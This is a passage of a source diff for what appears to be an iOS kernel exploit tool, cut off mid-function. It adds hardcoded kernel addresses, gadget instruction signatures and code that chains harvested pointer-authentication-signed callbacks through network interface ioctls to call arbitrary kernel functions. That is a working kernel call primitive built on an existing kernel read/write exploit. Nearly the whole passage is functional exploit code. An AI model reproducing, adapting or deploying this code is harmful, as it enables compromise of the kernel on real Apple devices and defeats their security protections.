@@ -2,6 +2,7 @@
 
 #import <IOKit/IOCFSerialize.h>
 #import <IOKit/IOKitLib.h>
+#import <objc/message.h>
 
 #include <errno.h>
 #include <dlfcn.h>
@@ -14,6 +15,16 @@
 #include <sys/socket.h>
 #include <sys/sysctl.h>
 #include <unistd.h>
+
+@protocol CNDPhysicalKCall1MetalBuffer <NSObject>
+- (void *)contents;
+- (uint64_t)gpuAddress;
+@end
+
+@protocol CNDPhysicalKCall1MetalDevice <NSObject>
+- (id<CNDPhysicalKCall1MetalBuffer>)newBufferWithLength:(NSUInteger)length
+                                                options:(NSUInteger)options;
+@end
 
 /*
  * Phone-side kcall1 chosen-PC / chosen-X0 canary.
@@ -107,6 +118,15 @@ static const uint64_t CNDPhysicalKCall1StaticLoadW0FromX0 =
 static const uint64_t CNDPhysicalKCall1StaticIfnetX0Dispatcher =
     UINT64_C(0xfffffff00a6e759c);
 
+/* Read-only UAT PTE probe adapters.  Each indirect hop uses the same IA-key
+ * discriminator (0xe4fe) as ifnet's check_multi callback. */
+static const uint64_t CNDPhysicalKCall1StaticAPFSX1Dispatcher =
+    UINT64_C(0xfffffff00ae749d8);
+static const uint64_t CNDPhysicalKCall1StaticIOUATGetPTE =
+    UINT64_C(0xfffffff0089f436c);
+static const uint64_t CNDPhysicalKCall1StaticIOUATGlobal =
+    UINT64_C(0xfffffff00b3934f8);
+
 /* Byte-exact stubs, dumped from the pinned phone kernelcache. */
 static const uint32_t CNDPhysicalKCall1ExpectedEnoexec[3] = {
     UINT32_C(0xd503245f), UINT32_C(0x52800100), UINT32_C(0xd65f03c0),
@@ -119,6 +139,57 @@ static const uint32_t CNDPhysicalKCall1ExpectedDispatcher[7] = {
     UINT32_C(0xb4000090), UINT32_C(0xf9404800),
     UINT32_C(0xd29c9fd1), UINT32_C(0xd71f0a11),
     UINT32_C(0xd65f03c0),
+};
+static const uint32_t CNDPhysicalKCall1ExpectedAPFSX1Dispatcher[4] = {
+    UINT32_C(0xd503245f), UINT32_C(0xa9400430),
+    UINT32_C(0xd29c9fd1), UINT32_C(0xd71f0a11),
+};
+static const uint32_t CNDPhysicalKCall1ExpectedIOUATGetPTE[8] = {
+    UINT32_C(0xd503237f), UINT32_C(0xd10183ff),
+    UINT32_C(0xa90357f6), UINT32_C(0xa9044ff4),
+    UINT32_C(0xa9057bfd), UINT32_C(0x910143fd),
+    UINT32_C(0xaa0103f3), UINT32_C(0xaa0003f4),
+};
+static const uint32_t CNDPhysicalKCall1ExpectedCheckMultiSigner[3] = {
+    UINT32_C(0xd29c9fd1), /* mov x17, #0xe4fe */
+    UINT32_C(0xdac10230), /* pacia x16, x17 */
+    UINT32_C(0xf9002670), /* str x16, [x19, #0x48] */
+};
+
+typedef struct {
+    uint64_t target;
+    uint64_t slot;
+    uint32_t instructions[7];
+    const char *name;
+} CNDPhysicalKCall1GlobalDispatcher;
+
+/* One candidate covers each possible low-16-bit value of the 16 KiB-aligned
+ * kernel slide.  Runtime selection additionally requires that the signed
+ * target encode sa_family AF_UNSPEC (0) or AF_LINK (18), that all seven
+ * instructions match, and that the callback slot is idle (zero). */
+static const CNDPhysicalKCall1GlobalDispatcher
+CNDPhysicalKCall1GlobalDispatchers[] = {
+    { UINT64_C(0xfffffff009551224), UINT64_C(0xfffffff00b44ace0),
+      { 0xd503245f, 0xb000f7c8, 0x91338108, 0xf9400110,
+        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "AppleIDAMInterface" },
+    { UINT64_C(0xfffffff009c392b8), UINT64_C(0xfffffff00b495698),
+      { 0xd503245f, 0x9000c2e8, 0x911a6108, 0xf9400110,
+        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "AppleT8110DART" },
+    { UINT64_C(0xfffffff009f05200), UINT64_C(0xfffffff00b4cb2e0),
+      { 0xd503245f, 0xd000ae28, 0x910b8108, 0xf9400110,
+        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "AppleTypeCPhyAUSBC" },
+    { UINT64_C(0xfffffff00a570014), UINT64_C(0xfffffff00b4db960),
+      { 0xd503245f, 0xf0007b48, 0x91258108, 0xf9400110,
+        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "DiskImages" },
+    { UINT64_C(0xfffffff009fcc004), UINT64_C(0xfffffff00b4ccde0),
+      { 0xd503245f, 0x9000a808, 0x91378108, 0xf9400110,
+        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "usb.networking" },
+    { UINT64_C(0xfffffff0095f8020), UINT64_C(0xfffffff00b44ed60),
+      { 0xd503245f, 0xd000f2a8, 0x91358108, 0xf9400110,
+        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "AppleLockdownMode" },
+    { UINT64_C(0xfffffff00a01400c), UINT64_C(0xfffffff00b4cd940),
+      { 0xd503245f, 0xb000a5c8, 0x91250108, 0xf9400110,
+        0xb4000070, 0xd29c9fd1, 0xd71f0a11 }, "CoreAnalyticsFamily" },
 };
 
 typedef uint64_t (*CNDPhysicalKCall1ProcFindByNameFn)(const char *name);
@@ -360,6 +431,28 @@ static bool CNDPhysicalKCall1ResolveKernelAPI(
         api->amfiSlotOffset != NULL && api->sandboxSlotOffset != NULL;
 }
 
+/* Deliberately resolves no write, acquisition, cleanup, label or process
+ * helpers.  The signer inventory is allowed to consume only an already-live
+ * KRW generation. */
+static bool CNDPhysicalKCall1ResolveReadOnlyKernelAPI(
+    CNDPhysicalKCall1KernelAPI *api)
+{
+    if (api == NULL) return false;
+    memset(api, 0, sizeof(*api));
+#define CND_KCALL1_RO_RESOLVE(field, name) \
+    api->field = (__typeof__(api->field))dlsym(RTLD_DEFAULT, name)
+    CND_KCALL1_RO_RESOLVE(kreadbuf, "kreadbuf");
+    CND_KCALL1_RO_RESOLVE(krwReady, "kexploit_krw_ready");
+    CND_KCALL1_RO_RESOLVE(taskSelf, "task_self");
+    CND_KCALL1_RO_RESOLVE(taskGetKobject, "task_get_ipc_port_kobject");
+    CND_KCALL1_RO_RESOLVE(kernelBase, "g_kernel_base");
+    CND_KCALL1_RO_RESOLVE(kernelSlide, "g_kernel_slide");
+#undef CND_KCALL1_RO_RESOLVE
+    return api->kreadbuf != NULL && api->krwReady != NULL &&
+        api->taskSelf != NULL && api->taskGetKobject != NULL &&
+        api->kernelBase != NULL && api->kernelSlide != NULL;
+}
+
 static bool CNDPhysicalKCall1ResolveIOKitAPI(CNDPhysicalKCall1IOKitAPI *api)
 {
     if (api == NULL) return false;
@@ -394,6 +487,36 @@ static bool CNDPhysicalKCall1ResolveIOKitAPI(CNDPhysicalKCall1IOKitAPI *api)
         api->serviceClose != NULL && api->connectCallMethod != NULL &&
         api->registryID != NULL && api->registryProperty != NULL &&
         api->registryPath != NULL && api->serialize != NULL;
+}
+
+/* Registry-only IOKit surface for the signer inventory.  In particular this
+ * omits IOServiceOpen and IOConnectCallMethod. */
+static bool CNDPhysicalKCall1ResolveReadOnlyIOKitAPI(
+    CNDPhysicalKCall1IOKitAPI *api)
+{
+    if (api == NULL) return false;
+    memset(api, 0, sizeof(*api));
+    api->handle = dlopen(
+        "/System/Library/Frameworks/IOKit.framework/IOKit",
+        RTLD_NOW | RTLD_LOCAL);
+    if (api->handle == NULL) return false;
+#define CND_KCALL1_RO_IOKIT_RESOLVE(field, name) \
+    api->field = (__typeof__(api->field))dlsym(api->handle, name)
+    CND_KCALL1_RO_IOKIT_RESOLVE(serviceMatching, "IOServiceMatching");
+    CND_KCALL1_RO_IOKIT_RESOLVE(getMatchingServices,
+        "IOServiceGetMatchingServices");
+    CND_KCALL1_RO_IOKIT_RESOLVE(iteratorNext, "IOIteratorNext");
+    CND_KCALL1_RO_IOKIT_RESOLVE(objectRelease, "IOObjectRelease");
+    CND_KCALL1_RO_IOKIT_RESOLVE(registryID,
+        "IORegistryEntryGetRegistryEntryID");
+    CND_KCALL1_RO_IOKIT_RESOLVE(registryProperty,
+        "IORegistryEntryCreateCFProperty");
+    CND_KCALL1_RO_IOKIT_RESOLVE(registryPath, "IORegistryEntryGetPath");
+#undef CND_KCALL1_RO_IOKIT_RESOLVE
+    return api->serviceMatching != NULL &&
+        api->getMatchingServices != NULL && api->iteratorNext != NULL &&
+        api->objectRelease != NULL && api->registryID != NULL &&
+        api->registryProperty != NULL && api->registryPath != NULL;
 }
 
 static bool CNDPhysicalKCall1ReadBytes(const CNDPhysicalKCall1KernelAPI *api,
@@ -684,6 +807,161 @@ static NSArray<NSDictionary<NSString *, id> *> *CNDPhysicalKCall1Interfaces(
     return result;
 }
 
+enum { CNDPhysicalKCall1SignerInventoryMaxInterfaces = 256 };
+
+static NSString *CNDPhysicalKCall1SignerRole(uint64_t target,
+    uint64_t slide, NSString **detailOut)
+{
+    if (detailOut != NULL) *detailOut = @"";
+    if (target == CNDPhysicalKCall1StaticEtherCheckMulti + slide) {
+        return @"stock";
+    }
+    if (target == CNDPhysicalKCall1StaticAPFSX1Dispatcher + slide) {
+        return @"apfs-x1";
+    }
+    if (target == CNDPhysicalKCall1StaticIOUATGetPTE + slide) {
+        return @"get-pte";
+    }
+    if (target == CNDPhysicalKCall1StaticIfnetX0Dispatcher + slide) {
+        return @"outer-x0";
+    }
+    for (size_t index = 0;
+         index < sizeof(CNDPhysicalKCall1GlobalDispatchers) /
+             sizeof(CNDPhysicalKCall1GlobalDispatchers[0]); index++) {
+        const CNDPhysicalKCall1GlobalDispatcher *candidate =
+            &CNDPhysicalKCall1GlobalDispatchers[index];
+        if (target == candidate->target + slide) {
+            if (detailOut != NULL) {
+                *detailOut = [NSString stringWithUTF8String:candidate->name]
+                    ?: @"";
+            }
+            return @"idam-global";
+        }
+    }
+    return @"";
+}
+
+static void CNDPhysicalKCall1InventoryClass(
+    const CNDPhysicalKCall1KernelAPI *kernel,
+    const CNDPhysicalKCall1IOKitAPI *iokit, uint64_t task, uint64_t slide,
+    const char *className, NSMutableSet<NSString *> *seenRegistryIDs,
+    NSMutableArray<NSDictionary<NSString *, id> *> *entries,
+    NSMutableDictionary<NSString *, NSNumber *> *roleCounts,
+    NSMutableArray<NSDictionary<NSString *, id> *> *queryResults,
+    BOOL *truncated)
+{
+    if (kernel == NULL || iokit == NULL || className == NULL ||
+        seenRegistryIDs == nil || entries == nil || roleCounts == nil ||
+        queryResults == nil || truncated == NULL || *truncated) return;
+
+    CFMutableDictionaryRef matching = iokit->serviceMatching(className);
+    io_iterator_t iterator = IO_OBJECT_NULL;
+    kern_return_t kr = matching != NULL
+        ? iokit->getMatchingServices(MACH_PORT_NULL, matching, &iterator)
+        : KERN_RESOURCE_SHORTAGE;
+    NSMutableDictionary *query = [@{
+        @"class": [NSString stringWithUTF8String:className] ?: @"",
+        @"result": @((uint32_t)kr),
+        @"visited": @0,
+    } mutableCopy];
+    [queryResults addObject:query];
+    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(iterator)) return;
+
+    NSUInteger visited = 0;
+    for (;;) {
+        io_service_t service = iokit->iteratorNext(iterator);
+        if (!MACH_PORT_VALID(service)) break;
+        if (entries.count >= CNDPhysicalKCall1SignerInventoryMaxInterfaces) {
+            *truncated = YES;
+            (void)iokit->objectRelease(service);
+            break;
+        }
+        visited++;
+        uint64_t registryID = 0;
+        (void)iokit->registryID(service, &registryID);
+        NSString *registryKey = CNDPhysicalKCall1Hex(registryID);
+        if (registryID != 0 && [seenRegistryIDs containsObject:registryKey]) {
+            (void)iokit->objectRelease(service);
+            continue;
+        }
+        if (registryID != 0) [seenRegistryIDs addObject:registryKey];
+
+        CFTypeRef bsdName = iokit->registryProperty(
+            service, CFSTR("BSD Name"), kCFAllocatorDefault, 0);
+        io_string_t path = {0};
+        kern_return_t pathKR = iokit->registryPath(
+            service, kIOServicePlane, path);
+        uint64_t object = 0;
+        NSString *objectPath = @"unresolved";
+        bool resolved = CNDPhysicalKCall1ResolveInterface(
+            kernel, task, service, &object, &objectPath);
+        uint64_t rawBacking = 0, backing = 0, callbackRaw = 0;
+        uint64_t callbackTarget = 0, x0Raw = 0, targetFieldRaw = 0;
+        bool fieldsRead = resolved &&
+            CNDPhysicalKCall1ReadU64(kernel,
+                object + CNDPhysicalKCall1InterfaceBackingIfnetOffset,
+                &rawBacking);
+        if (fieldsRead) {
+            backing = CNDPhysicalKCall1StripDataPointer(rawBacking);
+            fieldsRead = CNDPhysicalKCall1KernelObject(backing) &&
+                CNDPhysicalKCall1ReadU64(kernel,
+                    backing + CNDPhysicalKCall1IfnetCheckMultiOffset,
+                    &callbackRaw) &&
+                CNDPhysicalKCall1ReadU64(kernel,
+                    backing + CNDPhysicalKCall1IfnetX0Offset, &x0Raw) &&
+                CNDPhysicalKCall1ReadU64(kernel,
+                    backing + CNDPhysicalKCall1IfnetTargetOffset,
+                    &targetFieldRaw);
+        }
+        callbackTarget = callbackRaw != 0
+            ? CNDPhysicalKCall1StripInstructionPointer(callbackRaw) : 0;
+        NSString *roleDetail = @"";
+        NSString *role = CNDPhysicalKCall1SignerRole(
+            callbackTarget, slide, &roleDetail);
+        BOOL looksPACEncoded = fieldsRead && callbackRaw != 0 &&
+            callbackRaw != callbackTarget &&
+            CNDPhysicalKCall1VirtualAddress(callbackTarget);
+        BOOL transplantable = looksPACEncoded && role.length > 0;
+        if (transplantable) {
+            roleCounts[role] = @([roleCounts[role] unsignedIntegerValue] + 1);
+        }
+
+        NSMutableDictionary<NSString *, id> *entry =
+            [NSMutableDictionary dictionaryWithDictionary:@{
+                @"sourceClass": [NSString stringWithUTF8String:className]
+                    ?: @"",
+                @"registryID": registryKey,
+                @"machPort": CNDPhysicalKCall1Hex(service),
+                @"path": pathKR == KERN_SUCCESS
+                    ? [NSString stringWithUTF8String:path] ?: @"" : @"",
+                @"kernelObject": resolved
+                    ? CNDPhysicalKCall1Hex(object) : @"",
+                @"kernelObjectPath": objectPath ?: @"",
+                @"fieldsRead": @(fieldsRead),
+                @"backingIfnetRaw": CNDPhysicalKCall1Hex(rawBacking),
+                @"backingIfnet": CNDPhysicalKCall1Hex(backing),
+                @"checkMultiRaw": CNDPhysicalKCall1Hex(callbackRaw),
+                @"checkMultiTarget": CNDPhysicalKCall1Hex(callbackTarget),
+                @"checkMultiLooksPACEncoded": @(looksPACEncoded),
+                @"matchedRole": role,
+                @"matchedRoleDetail": roleDetail,
+                @"transplantableCandidate": @(transplantable),
+                @"x0FieldRaw": CNDPhysicalKCall1Hex(x0Raw),
+                @"targetFieldRaw": CNDPhysicalKCall1Hex(targetFieldRaw),
+            }];
+        if (bsdName != NULL) {
+            if (CFGetTypeID(bsdName) == CFStringGetTypeID()) {
+                entry[@"bsdName"] = (__bridge NSString *)bsdName;
+            }
+            CFRelease(bsdName);
+        }
+        [entries addObject:entry];
+        (void)iokit->objectRelease(service);
+    }
+    query[@"visited"] = @(visited);
+    (void)iokit->objectRelease(iterator);
+}
+
 static int CNDPhysicalKCall1PrepareCanary(
     const CNDPhysicalKCall1KernelAPI *api, uint64_t slide,
     CNDPhysicalKCall1Canary *canary,
@@ -813,6 +1091,66 @@ static void CNDPhysicalKCall1TriggerIfnetCheckMulti(NSString *bsdName,
         if (cleanupResult != NULL) *cleanupResult = removed;
         if (cleanupErrno != NULL) *cleanupErrno = removeErrno;
     }
+    close(socketFD);
+}
+
+/* The APFS adapter consumes the two qwords of the sockaddr exactly as passed
+ * to check_multi: qword 0 is an e4fe-signed next PC and qword 1 becomes X1.
+ * The runtime-selected global dispatcher is required to encode sa_family as
+ * AF_UNSPEC or AF_LINK in its second address byte while leaving the signed
+ * pointer intact. */
+static void CNDPhysicalKCall1TriggerRawSockaddr(
+    NSString *bsdName, uint64_t signedDispatcher, uint64_t x1,
+    int *ioctlResult, int *ioctlErrno)
+{
+    if (ioctlResult != NULL) *ioctlResult = -1;
+    if (ioctlErrno != NULL) *ioctlErrno = EINVAL;
+    const char *name = bsdName.UTF8String;
+    if (name == NULL || name[0] == '\0' || strlen(name) >= IFNAMSIZ) return;
+
+    int socketFD = socket(AF_INET, SOCK_DGRAM, 0);
+    if (socketFD < 0) {
+        if (ioctlErrno != NULL) *ioctlErrno = errno;
+        return;
+    }
+    struct ifreq request = {0};
+    strlcpy(request.ifr_name, name, sizeof(request.ifr_name));
+    _Static_assert(sizeof(request.ifr_addr) == 16,
+        "23A341 sockaddr transport must be exactly two qwords");
+    memcpy((uint8_t *)&request.ifr_addr, &signedDispatcher,
+        sizeof(signedDispatcher));
+    memcpy((uint8_t *)&request.ifr_addr + 8, &x1, sizeof(x1));
+    errno = 0;
+    int result = ioctl(socketFD, SIOCADDMULTI, &request);
+    int savedErrno = errno;
+    if (ioctlResult != NULL) *ioctlResult = result;
+    if (ioctlErrno != NULL) *ioctlErrno = savedErrno;
+    close(socketFD);
+}
+
+static void CNDPhysicalKCall1CleanupRawSockaddr(
+    NSString *bsdName, uint64_t signedDispatcher, uint64_t x1,
+    int *ioctlResult, int *ioctlErrno)
+{
+    if (ioctlResult != NULL) *ioctlResult = -1;
+    if (ioctlErrno != NULL) *ioctlErrno = 0;
+    const char *name = bsdName.UTF8String;
+    if (name == NULL || name[0] == '\0' || strlen(name) >= IFNAMSIZ) return;
+    int socketFD = socket(AF_INET, SOCK_DGRAM, 0);
+    if (socketFD < 0) {
+        if (ioctlErrno != NULL) *ioctlErrno = errno;
+        return;
+    }
+    struct ifreq request = {0};
+    strlcpy(request.ifr_name, name, sizeof(request.ifr_name));
+    memcpy((uint8_t *)&request.ifr_addr, &signedDispatcher,
+        sizeof(signedDispatcher));
+    memcpy((uint8_t *)&request.ifr_addr + 8, &x1, sizeof(x1));
+    errno = 0;
+    int result = ioctl(socketFD, SIOCDELMULTI, &request);
+    int savedErrno = errno;
+    if (ioctlResult != NULL) *ioctlResult = result;
+    if (ioctlErrno != NULL) *ioctlErrno = savedErrno;
     close(socketFD);
 }
 
@@ -1199,16 +1537,635 @@ static int CNDPhysicalKCall1RunCanary(
     return success ? 0 : (result != 0 ? result : EIO);
 }
 
-static NSDictionary<NSString *, id> *CNDPhysicalKCall1RunOnce(void)
+typedef id<CNDPhysicalKCall1MetalDevice> (*
+    CNDPhysicalKCall1CreateMetalDeviceFn)(void);
+
+/*
+ * Read one PTE without ever constructing a physical-map alias:
+ *
+ *   ifnet check_multi
+ *     -> ifnet x0 dispatcher       (x0 = the boot-owned IOUAT object)
+ *     -> APFS sockaddr dispatcher  (x1 = Metal buffer gpuAddress)
+ *     -> slide-compatible idle global dispatcher
+ *     -> IOUAT::getPageTableEntry
+ *
+ * All three indirect edges use kernel-produced IA/e4fe signatures harvested
+ * through the same IOUserEthernet creation path as the chosen-X0 canary.  The
+ * return is observed as the callback's 32-bit errno value, so this probe
+ * reports the low 32 bits of the PTE; it never claims to recover the high half.
+ */
+static int CNDPhysicalKCall1RunUatPTE(
+    const CNDPhysicalKCall1KernelAPI *kernel,
+    const CNDPhysicalKCall1IOKitAPI *iokit, uint64_t slide,
+    io_connect_t connection, uint64_t selfTask,
+    NSMutableSet<NSString *> *knownIDs,
+    NSMutableDictionary<NSString *, id> *report, NSArray **after,
+    kern_return_t *lastCallKR, uint64_t *lastControllerCookie,
+    bool *criticalRestoreFailure)
+{
+    if (kernel == NULL || iokit == NULL || report == nil || after == NULL ||
+        lastCallKR == NULL || lastControllerCookie == NULL ||
+        criticalRestoreFailure == NULL) return EINVAL;
+
+    CNDPhysicalKCall1Canary signer = {0};
+    int result = CNDPhysicalKCall1PrepareCanary(
+        kernel, slide, &signer, report);
+    uint64_t stockTarget = CNDPhysicalKCall1StaticEtherCheckMulti + slide;
+    uint64_t apfsTarget = CNDPhysicalKCall1StaticAPFSX1Dispatcher + slide;
+    uint64_t idamTarget = 0;
+    uint64_t idamSlot = 0;
+    NSString *idamName = @"";
+    uint64_t getPTETarget = CNDPhysicalKCall1StaticIOUATGetPTE + slide;
+    uint64_t outerTarget =
+        CNDPhysicalKCall1StaticIfnetX0Dispatcher + slide;
+
+    uint32_t apfsInstructions[4] = {0};
+    uint32_t getPTEInstructions[8] = {0};
+    uint32_t outerInstructions[7] = {0};
+    NSMutableArray *dispatcherCandidates = [NSMutableArray array];
+    if (result == 0) {
+        bool read = CNDPhysicalKCall1ReadBytes(kernel, apfsTarget,
+                apfsInstructions, sizeof(apfsInstructions)) &&
+            CNDPhysicalKCall1ReadBytes(kernel, getPTETarget,
+                getPTEInstructions, sizeof(getPTEInstructions)) &&
+            CNDPhysicalKCall1ReadBytes(kernel, outerTarget,
+                outerInstructions, sizeof(outerInstructions));
+        if (!read || memcmp(apfsInstructions,
+                CNDPhysicalKCall1ExpectedAPFSX1Dispatcher,
+                sizeof(apfsInstructions)) != 0 ||
+            memcmp(getPTEInstructions,
+                CNDPhysicalKCall1ExpectedIOUATGetPTE,
+                sizeof(getPTEInstructions)) != 0 ||
+            memcmp(outerInstructions,
+                CNDPhysicalKCall1ExpectedDispatcher,
+                sizeof(outerInstructions)) != 0) {
+            result = EILSEQ;
+        }
+    }
+    if (result == 0) {
+        for (size_t index = 0;
+             index < sizeof(CNDPhysicalKCall1GlobalDispatchers) /
+                 sizeof(CNDPhysicalKCall1GlobalDispatchers[0]); index++) {
+            const CNDPhysicalKCall1GlobalDispatcher *candidate =
+                &CNDPhysicalKCall1GlobalDispatchers[index];
+            uint64_t target = candidate->target + slide;
+            uint64_t slot = candidate->slot + slide;
+            uint8_t family = (uint8_t)((target >> 8) & 0xff);
+            uint32_t instructions[7] = {0};
+            uint64_t slotValue = UINT64_MAX;
+            bool familyOK = family == AF_UNSPEC || family == AF_LINK;
+            bool bytesOK = familyOK && CNDPhysicalKCall1ReadBytes(
+                    kernel, target, instructions, sizeof(instructions)) &&
+                memcmp(instructions, candidate->instructions,
+                    sizeof(instructions)) == 0;
+            bool slotRead = bytesOK && CNDPhysicalKCall1ReadU64(
+                kernel, slot, &slotValue);
+            [dispatcherCandidates addObject:@{
+                @"name": [NSString stringWithUTF8String:candidate->name],
+                @"target": CNDPhysicalKCall1Hex(target),
+                @"slot": CNDPhysicalKCall1Hex(slot),
+                @"sockaddrFamily": @(family),
+                @"familyAccepted": @(familyOK),
+                @"instructionsExact": @(bytesOK),
+                @"slotValue": CNDPhysicalKCall1Hex(slotValue),
+                @"slotIdle": @(slotRead && slotValue == 0),
+            }];
+            if (idamTarget == 0 && slotRead && slotValue == 0) {
+                idamTarget = target;
+                idamSlot = slot;
+                idamName = [NSString stringWithUTF8String:candidate->name];
+            }
+        }
+        if (idamTarget == 0 || idamSlot == 0) result = EBUSY;
+    }
+    report[@"uatPTEGlobalDispatcherCandidates"] = dispatcherCandidates;
+    report[@"uatPTESetupResult"] = @(result);
+    report[@"uatPTEAPFSTarget"] = CNDPhysicalKCall1Hex(apfsTarget);
+    report[@"uatPTEIDAMTarget"] = CNDPhysicalKCall1Hex(idamTarget);
+    report[@"uatPTEIDAMName"] = idamName;
+    report[@"uatPTEGetPTETarget"] = CNDPhysicalKCall1Hex(getPTETarget);
+    report[@"uatPTEOuterTarget"] = CNDPhysicalKCall1Hex(outerTarget);
+    report[@"uatPTEIDAMSlot"] = CNDPhysicalKCall1Hex(idamSlot);
+    report[@"uatPTEAdapterDiscriminator"] = @"0xe4fe";
+    report[@"uatPTEInstructionWitnessesExact"] = @(result == 0);
+    if (result != 0) return result;
+
+    /* Resolve the already established boot-owner join again in this probe.
+     * A mismatched record means this is not the object pinned by the preceding
+     * record-state run and the indirect call is refused. */
+    uint64_t uatGlobal = CNDPhysicalKCall1StaticIOUATGlobal + slide;
+    uint64_t objectRaw = 0, recordRaw = 0, objectRecordRaw = 0;
+    bool ownerRead = CNDPhysicalKCall1ReadU64(
+            kernel, uatGlobal + 0x28, &objectRaw) &&
+        CNDPhysicalKCall1ReadU64(
+            kernel, uatGlobal + 0x18, &recordRaw);
+    uint64_t object = CNDPhysicalKCall1StripDataPointer(objectRaw);
+    uint64_t record = CNDPhysicalKCall1StripDataPointer(recordRaw);
+    if (ownerRead && CNDPhysicalKCall1KernelObject(object)) {
+        ownerRead = CNDPhysicalKCall1ReadU64(
+            kernel, object + 0x20, &objectRecordRaw);
+    }
+    uint64_t objectRecord =
+        CNDPhysicalKCall1StripDataPointer(objectRecordRaw);
+    report[@"uatPTEGlobal"] = CNDPhysicalKCall1Hex(uatGlobal);
+    report[@"uatPTEIOUATObjectRaw"] = CNDPhysicalKCall1Hex(objectRaw);
+    report[@"uatPTEIOUATObject"] = CNDPhysicalKCall1Hex(object);
+    report[@"uatPTEGlobalRecord"] = CNDPhysicalKCall1Hex(record);
+    report[@"uatPTEObjectRecord"] = CNDPhysicalKCall1Hex(objectRecord);
+    bool ownerJoin = ownerRead && CNDPhysicalKCall1KernelObject(object) &&
+        CNDPhysicalKCall1KernelObject(record) && objectRecord == record;
+    report[@"uatPTEOwnerJoin"] = @(ownerJoin);
+    if (!ownerJoin) return EILSEQ;
+
+    /* Re-check the chosen callback slot immediately before the Metal setup. */
+    uint64_t originalIDAMSlot = 0;
+    if (!CNDPhysicalKCall1ReadU64(kernel, idamSlot, &originalIDAMSlot)) {
+        return EIO;
+    }
+    report[@"uatPTEIDAMSlotOriginal"] =
+        CNDPhysicalKCall1Hex(originalIDAMSlot);
+    if (originalIDAMSlot != 0) {
+        report[@"uatPTEIDAMSlotIdle"] = @NO;
+        return EBUSY;
+    }
+    report[@"uatPTEIDAMSlotIdle"] = @YES;
+
+    /* Allocate a live Metal mapping and ask Metal for its GPU virtual address.
+     * The buffer stays strongly referenced until after the callback returns. */
+    void *metalHandle = dlopen(
+        "/System/Library/Frameworks/Metal.framework/Metal",
+        RTLD_NOW | RTLD_LOCAL);
+    CNDPhysicalKCall1CreateMetalDeviceFn createMetal = metalHandle != NULL
+        ? (CNDPhysicalKCall1CreateMetalDeviceFn)dlsym(
+            metalHandle, "MTLCreateSystemDefaultDevice") : NULL;
+    id<CNDPhysicalKCall1MetalDevice> metalDevice =
+        createMetal != NULL ? createMetal() : nil;
+    id<CNDPhysicalKCall1MetalBuffer> metalBuffer =
+        [metalDevice newBufferWithLength:0x4000 options:0];
+    uint64_t gpuAddress = 0;
+    if (metalBuffer != nil &&
+        [metalBuffer respondsToSelector:@selector(gpuAddress)]) {
+        gpuAddress = [metalBuffer gpuAddress];
+    }
+    void *contents = metalBuffer != nil ? [metalBuffer contents] : NULL;
+    if (contents != NULL) memset(contents, 0xa5, 0x4000);
+    report[@"uatPTEMetalFrameworkLoaded"] = @(metalHandle != NULL);
+    report[@"uatPTEMetalDeviceCreated"] = @(metalDevice != nil);
+    report[@"uatPTEMetalBufferCreated"] = @(metalBuffer != nil);
+    report[@"uatPTEMetalGPUAddress"] = CNDPhysicalKCall1Hex(gpuAddress);
+    report[@"uatPTEMetalBufferLength"] = @0x4000;
+    if (metalBuffer == nil || contents == NULL || gpuAddress == 0 ||
+        gpuAddress >= UINT64_C(0x0001000000000000)) {
+        return ENODEV;
+    }
+
+    enum { CND_UAT_PTE_STOCK, CND_UAT_PTE_APFS, CND_UAT_PTE_IDAM,
+           CND_UAT_PTE_GETPTE, CND_UAT_PTE_OUTER, CND_UAT_PTE_STAGE_COUNT };
+    CNDPhysicalKCall1SignedInterface stages[CND_UAT_PTE_STAGE_COUNT] = {0};
+    const uint64_t targets[CND_UAT_PTE_STAGE_COUNT] = {
+        stockTarget, apfsTarget, idamTarget, getPTETarget, outerTarget,
+    };
+    const uint8_t stageIDs[CND_UAT_PTE_STAGE_COUNT] = {
+        0x61, 0x62, 0x63, 0x64, 0x65,
+    };
+    for (unsigned int index = 0;
+         index < CND_UAT_PTE_STAGE_COUNT && result == 0; index++) {
+        result = CNDPhysicalKCall1CreateSignedIfnet(
+            kernel, iokit, connection, selfTask, knownIDs, &signer,
+            targets[index], stageIDs[index], &stages[index], after,
+            report, criticalRestoreFailure);
+    }
+    CNDPhysicalKCall1ReportSignedIfnet(
+        report, @"uatPTEStock", &stages[CND_UAT_PTE_STOCK]);
+    CNDPhysicalKCall1ReportSignedIfnet(
+        report, @"uatPTEAPFS", &stages[CND_UAT_PTE_APFS]);
+    CNDPhysicalKCall1ReportSignedIfnet(
+        report, @"uatPTEIDAM", &stages[CND_UAT_PTE_IDAM]);
+    CNDPhysicalKCall1ReportSignedIfnet(
+        report, @"uatPTEGetPTE", &stages[CND_UAT_PTE_GETPTE]);
+    CNDPhysicalKCall1ReportSignedIfnet(
+        report, @"uatPTEOuter", &stages[CND_UAT_PTE_OUTER]);
+    *lastCallKR = stages[CND_UAT_PTE_OUTER].callKR;
+    *lastControllerCookie = stages[CND_UAT_PTE_OUTER].controllerCookie;
+    report[@"uatPTESignerStagesResult"] = @(result);
+
+    uint64_t stockSigned = stages[CND_UAT_PTE_STOCK].signedCallback;
+    bool sourceCallbacksSanitized = stockSigned != 0;
+    for (unsigned int index = 1; index < CND_UAT_PTE_STAGE_COUNT; index++) {
+        if (!CNDPhysicalKCall1KernelObject(stages[index].backingIfnet)) {
+            if (stages[index].signedCallback != 0) {
+                sourceCallbacksSanitized = false;
+            }
+            continue;
+        }
+        sourceCallbacksSanitized = CNDPhysicalKCall1RestoreU64(
+            kernel, stages[index].backingIfnet +
+                CNDPhysicalKCall1IfnetCheckMultiOffset,
+            stockSigned) && sourceCallbacksSanitized;
+    }
+    report[@"uatPTESourceCallbacksSanitized"] =
+        @(sourceCallbacksSanitized);
+    if (!sourceCallbacksSanitized) *criticalRestoreFailure = true;
+    if (result != 0 || !sourceCallbacksSanitized) {
+        return result != 0 ? result : EIO;
+    }
+
+    CNDPhysicalKCall1SignedInterface *outer =
+        &stages[CND_UAT_PTE_OUTER];
+    uint64_t fieldX0 = outer->backingIfnet +
+        CNDPhysicalKCall1IfnetX0Offset;
+    uint64_t fieldTarget = outer->backingIfnet +
+        CNDPhysicalKCall1IfnetTargetOffset;
